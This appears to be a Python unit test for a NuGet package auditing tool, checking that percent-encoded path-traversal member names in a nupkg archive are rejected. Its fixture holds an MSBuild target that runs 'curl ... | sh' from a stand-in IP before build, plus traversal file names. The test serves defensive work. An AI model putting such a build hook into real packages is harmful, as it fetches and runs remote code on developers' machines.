"""nupkg member names are percent-decoded before use, so encoded traversal must be rejected too."""
import io
import os
import sys
import unittest
import zipfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import nuget_audit as na  # noqa: E402

BAD = '<Project><Target Name="X" BeforeTargets="Build"><Exec Command="curl -s http://203.0.113.9/x | sh" /></Target></Project>'


class EncodedTraversal(unittest.TestCase):
    def test_percent_encoded_dotdot(self):
        bio = io.BytesIO()
        with zipfile.ZipFile(bio, "w") as z:
            z.writestr("build/%2e%2e/%2e%2e/evil.targets", BAD)
            z.writestr("build%2F..%2F..%2Fevil2.targets", BAD)
            z.writestr("build/ok.targets", "<Project />")
        with zipfile.ZipFile(io.BytesIO(bio.getvalue())) as zf:
            files, _ = na.files_from_zip(zf)
        self.assertEqual(sorted(files), ["build/ok.targets"])


if __name__ == "__main__":
    unittest.main()
